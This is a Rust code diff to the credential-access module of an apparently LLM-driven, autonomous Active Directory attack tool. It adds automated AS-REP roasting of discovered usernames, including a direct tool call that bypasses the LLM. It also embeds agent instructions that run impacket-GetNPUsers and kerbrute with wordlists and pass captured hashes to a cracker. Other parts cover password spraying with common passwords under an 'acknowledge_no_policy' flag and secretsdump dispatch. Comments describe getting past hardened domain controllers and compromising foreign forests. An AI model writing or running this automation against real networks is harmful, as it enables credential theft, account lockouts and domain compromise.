@@ -80,32 +80,148 @@ pub async fn auto_credential_access(
             break;
         }
 
-        let asrep_work: Vec<(String, String)> = if !dispatcher.is_technique_allowed("asrep_roast") {
-            Vec::new()
-        } else {
-            let state = dispatcher.state.read().await;
-            state
-                .domains
-                .iter()
-                .filter(|d| !state.is_processed(DEDUP_ASREP_DOMAINS, d))
-                .filter_map(|domain| {
-                    // Try DC map first, then fall back to target_ips[0]
-                    let dc_ip = state
-                        .domain_controllers
-                        .get(domain)
-                        .cloned()
-                        .or_else(|| state.target_ips.first().cloned())?;
-                    Some((domain.clone(), dc_ip))
-                })
-                .collect()
-        };
+        // Re-armable dedup. The cold-start AS-REP dispatch fires before
+        // cross-forest LDAP enum has populated `state.users` for foreign
+        // forests — at that point known_users is empty and the dispatch
+        // uses the generic wordlist. Later, after the inter-realm ticket
+        // lands and LDAP-via-ticket enumerates the foreign forest's
+        // accounts in a SID-filtered cross-forest target, we MUST
+        // re-dispatch with known_users populated; otherwise the
+        // discovered usernames never get consumed by AS-REP. Key the
+        // dedup on `domain:has_users` so the "empty" and "non-empty"
+        // states are tracked independently — at most two dispatches per
+        // domain across the operation lifetime.
+        let asrep_work: Vec<(String, String, String)> =
+            if !dispatcher.is_technique_allowed("asrep_roast") {
+                Vec::new()
+            } else {
+                let state = dispatcher.state.read().await;
+                state
+                    .domains
+                    .iter()
+                    .filter_map(|domain| {
+                        let dom_l = domain.to_lowercase();
+                        let has_users = state.users.iter().any(|u| {
+                            u.domain.to_lowercase() == dom_l
+                                && !u.username.is_empty()
+                                && !u.username.ends_with('$')
+                        });
+                        let dedup_key =
+                            format!("{}:{}", dom_l, if has_users { "users" } else { "empty" });
+                        if state.is_processed(DEDUP_ASREP_DOMAINS, &dedup_key) {
+                            return None;
+                        }
+                        // Try DC map first, then fall back to target_ips[0]
+                        let dc_ip = state
+                            .domain_controllers
+                            .get(domain)
+                            .cloned()
+                            .or_else(|| state.target_ips.first().cloned())?;
+                        Some((domain.clone(), dc_ip, dedup_key))
+                    })
+                    .collect()
+            };
 
-        for (domain, dc_ip) in asrep_work {
-            let payload = json!({
+        for (domain, dc_ip, dedup_key) in asrep_work {
+            let (excluded_users, known_users) = {
+                let state = dispatcher.state.read().await;
+                let excluded = state.quarantined_principals_in_domain(&domain);
+                // Pull every username already discovered for this domain. AS-REP
+                // roasting needs a userlist to probe — `kerberos_user_enum_noauth`
+                // works on some DCs but is denied on hardened targets where
+                // anonymous SAMR returns STATUS_LOGON_FAILURE. Without a baked-in
+                // list the LLM has nothing to roast and the dispatch is wasted.
+                // We collect users from `state.users` (populated by initial enum
+                // + cross-forest LDAP-via-ticket), filter out the ones that aren't
+                // real principals (computer accounts ending in `$`), and pass
+                // them as `known_users` so the agent can immediately run
+                // `GetNPUsers -no-pass -usersfile <list>`. This is the load-
+                // bearing path for compromising a SID-filtered foreign forest
+                // via AS-REP — without it, the cross-forest LDAP enumeration's
+                // payoff (discovered usernames) never gets consumed by the
+                // AS-REP automation, and the chain stalls at the step right
+                // before a roastable account's hash would be captured.
+                let dom_l = domain.to_lowercase();
+                let mut users: Vec<String> = state
+                    .users
+                    .iter()
+                    .filter(|u| u.domain.to_lowercase() == dom_l)
+                    .filter(|u| !u.username.is_empty() && !u.username.ends_with('$'))
+                    .map(|u| u.username.clone())
+                    .collect();
+                users.sort();
+                users.dedup();
+                (excluded, users)
+            };
+            let mut payload = json!({
                 "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
                 "target_ip": dc_ip,
                 "domain": domain,
+                "excluded_users": excluded_users.join(","),
             });
+            if !known_users.is_empty() {
+                payload["known_users"] = json!(known_users);
+                payload["instructions"] = json!(format!(
+                    "{} usernames already discovered for {}. Run \
+                     `impacket-GetNPUsers -no-pass -dc-ip {} {}/ -usersfile <(echo \
+                     \"$known_users\")` and harvest any $krb5asrep$ hashes; \
+                     prioritise this over `kerberos_user_enum_noauth` (some \
+                     DCs deny anonymous SAMR). Hand any roastable hash to the \
+                     cracker tool immediately.",
+                    known_users.len(),
+                    domain,
+                    dc_ip,
+                    domain,
+                ));
+            } else {
+                // Cold start: no usernames discovered yet. Without an explicit
+                // userlist the LLM tends to call `kerberos_user_enum_noauth`,
+                // see the default tiny wordlist return no hits on a custom AD,
+                // and abandon the technique. Give it a concrete progressive
+                // enumeration plan so it tries broader wordlists (names.txt,
+                // top-usernames-shortlist.txt) before giving up — these
+                // commonly hit lab-themed accounts on EC2 worker images
+                // where seclists is preinstalled.
+                payload["instructions"] = json!(format!(
+                    "No usernames discovered yet for {dom}. Cold-start AS-REP \
+                     enumeration plan: \
+                     (1) `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ \
+                     -usersfile /usr/share/seclists/Usernames/Names/names.txt \
+                     -format hashcat` (zero-cred; returns $krb5asrep$ for any \
+                     preauth-disabled account). \
+                     (2) If step 1 returns no hashes, also try \
+                     `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` \
+                     and `/usr/share/seclists/Usernames/cirt-default-usernames.txt`. \
+                     (3) For username enumeration via Kerberos error codes \
+                     (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED), \
+                     run `kerbrute userenum --dc {ip} -d {dom} \
+                     /usr/share/seclists/Usernames/Names/names.txt` if \
+                     available. \
+                     (4) Hand every $krb5asrep$ hash to the cracker tool \
+                     immediately — even one cracked AS-REP hash unlocks an \
+                     authenticated foothold in {dom}. \
+                     Do NOT fall back to anonymous SAMR if it returns \
+                     ACCESS_DENIED; that path is dead on hardened DCs.",
+                    dom = domain,
+                    ip = dc_ip,
+                ));
+            }
+
+            // Mark dedup BEFORE either dispatch fires. The deterministic
+            // path below is fire-and-forget; if we deferred marking until
+            // after a successful LLM submit, a deferred/errored LLM submit
+            // would leave the deterministic spawn unguarded — next 15s tick
+            // would queue another background asrep_roast against the same
+            // userlist. Mark first, dispatch second.
+            dispatcher
+                .state
+                .write()
+                .await
+                .mark_processed(DEDUP_ASREP_DOMAINS, dedup_key.clone());
+            let _ = dispatcher
+                .state
+                .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &dedup_key)
+                .await;
 
             let priority = dispatcher.effective_priority("asrep_roast");
             match dispatcher
@@ -113,19 +229,80 @@ pub async fn auto_credential_access(
                 .await
             {
                 Ok(Some(task_id)) => {
-                    info!(task_id = %task_id, domain = %domain, "AS-REP roast dispatched");
-                    dispatcher
-                        .state
-                        .write()
-                        .await
-                        .mark_processed(DEDUP_ASREP_DOMAINS, domain.clone());
-                    let _ = dispatcher
-                        .state
-                        .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &domain)
-                        .await;
+                    info!(
+                        task_id = %task_id,
+                        domain = %domain,
+                        dedup_key = %dedup_key,
+                        known_users = known_users.len(),
+                        "AS-REP roast dispatched"
+                    );
                 }
                 Ok(None) => {}
                 Err(e) => warn!(err = %e, "Failed to dispatch AS-REP roast"),
+            }
+
+            // Deterministic AS-REP roast: when we already have a userlist,
+            // skip the LLM and call the tool directly. The LLM agent loop
+            // in the credential_access role consistently picks
+            // `password_spray` and `username_as_password` over
+            // `asrep_roast` despite the techniques ordering and explicit
+            // instructions — this leaves the most reliable foothold path
+            // for SID-filtered foreign forests (AS-REP roast of a preauth-
+            // disabled account from the discovered userlist) unexercised.
+            // dispatch_tool routes through the worker tool_exec subject and
+            // its discoveries flow into state via push_realtime_discoveries.
+            // Guarded by the dedup mark above — at most one deterministic
+            // dispatch per (domain, has-users) transition.
+            if !known_users.is_empty() {
+                let det_args = json!({
+                    "domain": domain,
+                    "dc_ip": dc_ip,
+                    "known_users": known_users,
+                });
+                let det_call = ares_llm::ToolCall {
+                    id: format!("asrep_det_{}", uuid::Uuid::new_v4().simple()),
+                    name: "asrep_roast".to_string(),
+                    arguments: det_args,
+                };
+                let det_task_id = format!(
+                    "asrep_det_{}",
+                    &uuid::Uuid::new_v4().simple().to_string()[..12]
+                );
+                info!(
+                    task_id = %det_task_id,
+                    domain = %domain,
+                    known_users = known_users.len(),
+                    "AS-REP roast dispatched (direct tool, no LLM)"
+                );
+                let dispatcher_bg = dispatcher.clone();
+                let domain_bg = domain.clone();
+                tokio::spawn(async move {
+                    match dispatcher_bg
+                        .llm_runner
+                        .tool_dispatcher()
+                        .dispatch_tool("credential_access", &det_task_id, &det_call)
+                        .await
+                    {
+                        Ok(result) => {
+                            let hash_count = result
+                                .discoveries
+                                .as_ref()
+                                .and_then(|d| d.get("hashes"))
+                                .and_then(|h| h.as_array())
+                                .map(|a| a.len())
+                                .unwrap_or(0);
+                            info!(
+                                task_id = %det_task_id,
+                                domain = %domain_bg,
+                                hash_count,
+                                "Deterministic AS-REP roast completed"
+                            );
+                        }
+                        Err(e) => {
+                            warn!(err = %e, domain = %domain_bg, "Deterministic AS-REP roast failed");
+                        }
+                    }
+                });
             }
         }
 
@@ -143,21 +320,21 @@ pub async fn auto_credential_access(
                     // lockout before S4U can use them.
                     .filter(|c| !state.is_delegation_account(&c.username))
                     // Skip quarantined credentials — locked out, retry after expiry.
-                    .filter(|c| !state.is_credential_quarantined(&c.username, &c.domain))
+                    .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                     .filter_map(|cred| {
                         let cred_domain = cred.domain.to_lowercase();
                         let dedup = kerberoast_dedup_key(&cred_domain, &cred.username);
                         if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup) {
                             return None;
                         }
-                        // Exact domain match first
-                        if let Some(dc_ip) = state.domain_controllers.get(&cred_domain).cloned() {
+                        // Exact domain match first (using robust DC resolution)
+                        if let Some(dc_ip) = state.resolve_dc_ip(&cred_domain) {
                             return Some((dedup, dc_ip, cred_domain, cred.clone()));
                         }
                         // Fallback: check child domains (e.g. cred has "contoso.local"
                         // but user is actually in "child.contoso.local")
                         let suffix = format!(".{cred_domain}");
-                        for (domain, dc_ip) in &state.domain_controllers {
+                        for (domain, dc_ip) in &state.all_domains_with_dcs() {
                             if domain.ends_with(&suffix) {
                                 debug!(
                                     cred_domain = %cred_domain,
@@ -215,10 +392,14 @@ pub async fn auto_credential_access(
                 .users
                 .iter()
                 .filter(|u| !u.domain.is_empty())
+                // Skip AD built-in disabled accounts (guest, krbtgt, etc.).
+                // Spraying these can never succeed and burns badPwdCount budget
+                // that real accounts share under domain lockout policy.
+                .filter(|u| !ares_core::models::is_always_disabled_account(&u.username))
                 // Skip delegation accounts — their auth budget is reserved for
                 // S4U exploitation. Spraying them causes lockout before S4U fires.
                 .filter(|u| !state.is_delegation_account(&u.username))
-                .filter(|u| !state.is_credential_quarantined(&u.username, &u.domain))
+                .filter(|u| !state.is_principal_quarantined(&u.username, &u.domain))
                 .filter_map(|u| {
                     let user_domain = u.domain.to_lowercase();
                     let dedup = spray_dedup_key(&user_domain, &u.username);
@@ -256,10 +437,16 @@ pub async fn auto_credential_access(
             }
             sprayed_domains.insert(domain.clone());
 
+            let excluded_users = dispatcher
+                .state
+                .read()
+                .await
+                .quarantined_principals_in_domain(domain);
             let payload = json!({
                 "technique": "username_as_password",
                 "target_ip": dc_ip,
                 "domain": domain,
+                "excluded_users": excluded_users.join(","),
             });
 
             match dispatcher
@@ -298,7 +485,7 @@ pub async fn auto_credential_access(
                 .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                 // Skip delegation accounts — their auth is reserved for S4U.
                 .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
-                .filter(|c| !state.is_credential_quarantined(&c.username, &c.domain))
+                .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                 .filter_map(|cred| {
                     let cred_domain = cred.domain.to_lowercase();
                     let dedup = low_hanging_dedup_key(&cred_domain, &cred.username);
@@ -383,7 +570,7 @@ pub async fn auto_credential_access(
                         // Skip delegation accounts — secretsdump will always fail
                         // (they're not admin) and burns auth budget needed for S4U.
                         .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
-                        .filter(|c| !state.is_credential_quarantined(&c.username, &c.domain))
+                        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                     {
                         let cred_domain = cred.domain.to_lowercase();
                         for host in &state.hosts {
@@ -442,11 +629,11 @@ pub async fn auto_credential_access(
                         username = %cred.username,
                         "Credential secretsdump dispatched"
                     );
-                    dispatcher
-                        .state
-                        .write()
-                        .await
-                        .mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                    {
+                        let mut state = dispatcher.state.write().await;
+                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                        state.mark_credential_capture_in_flight(&cred.domain);
+                    }
                     let _ = dispatcher
                         .state
                         .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
@@ -478,10 +665,15 @@ pub async fn auto_credential_access(
                         })
                         // Only spray after initial recon (AS-REP) has completed.
                         // This prevents spraying in the first cycle when Kerberoast
-                        // hasn't had time to collect hashes yet.
+                        // hasn't had time to collect hashes yet. AS-REP dedup is
+                        // keyed `domain:empty` or `domain:users` (re-armable on
+                        // user-list transitions); either form satisfies the gate.
                         .filter(|(domain, _)| {
-                            state.is_processed(DEDUP_ASREP_DOMAINS, domain)
-                                || state.is_processed(DEDUP_ASREP_DOMAINS, &domain.to_lowercase())
+                            let d = domain.to_lowercase();
+                            let empty_key = format!("{d}:empty");
+                            let users_key = format!("{d}:users");
+                            state.is_processed(DEDUP_ASREP_DOMAINS, &empty_key)
+                                || state.is_processed(DEDUP_ASREP_DOMAINS, &users_key)
                         })
                         // Only spray after delegation enumeration has dispatched for
                         // at least one credential in this domain. Spraying before
@@ -510,12 +702,19 @@ pub async fn auto_credential_access(
             };
 
         for (domain, dc_ip) in common_spray_work {
+            let excluded_users = dispatcher
+                .state
+                .read()
+                .await
+                .quarantined_principals_in_domain(&domain);
             let payload = json!({
                 "techniques": ["password_spray", "username_as_password"],
                 "reason": "low_hanging_fruit",
                 "target_ip": dc_ip,
                 "domain": domain,
                 "use_common_passwords": true,
+                "acknowledge_no_policy": true,
+                "excluded_users": excluded_users.join(","),
             });
 
             // Mark as processed BEFORE submitting to prevent duplicate deferred entries.
@@ -552,6 +751,8 @@ pub async fn auto_credential_access(
 mod tests {
     use super::*;
 
+    // --- kerberoast_dedup_key ---
+
     #[test]
     fn kerberoast_dedup_key_basic() {
         assert_eq!(
@@ -573,6 +774,8 @@ mod tests {
         assert_eq!(kerberoast_dedup_key("", ""), "krb::");
     }
 
+    // --- spray_dedup_key ---
+
     #[test]
     fn spray_dedup_key_basic() {
         assert_eq!(
@@ -591,6 +794,8 @@ mod tests {
         assert_eq!(spray_dedup_key("", ""), ":");
     }
 
+    // --- common_spray_dedup_key ---
+
     #[test]
     fn common_spray_dedup_key_basic() {
         assert_eq!(
@@ -604,6 +809,8 @@ mod tests {
         assert_eq!(common_spray_dedup_key(""), "common:");
     }
 
+    // --- low_hanging_dedup_key ---
+
     #[test]
     fn low_hanging_dedup_key_basic() {
         assert_eq!(
@@ -616,6 +823,8 @@ mod tests {
     fn low_hanging_dedup_key_empty() {
         assert_eq!(low_hanging_dedup_key("", ""), ":");
     }
+
+    // --- credential_secretsdump_dedup_key ---
 
     #[test]
     fn credential_secretsdump_dedup_key_basic() {
@@ -638,6 +847,8 @@ mod tests {
     fn credential_secretsdump_dedup_key_empty() {
         assert_eq!(credential_secretsdump_dedup_key("", "", ""), "::");
     }
+
+    // --- resolve_host_domain_from_fqdn ---
 
     #[test]
     fn resolve_host_domain_from_fqdn_typical() {
@@ -672,6 +883,8 @@ mod tests {
     fn resolve_host_domain_from_fqdn_empty() {
         assert_eq!(resolve_host_domain_from_fqdn(""), "");
     }
+
+    // --- is_host_domain_related ---
 
     #[test]
     fn is_host_domain_related_same_domain() {
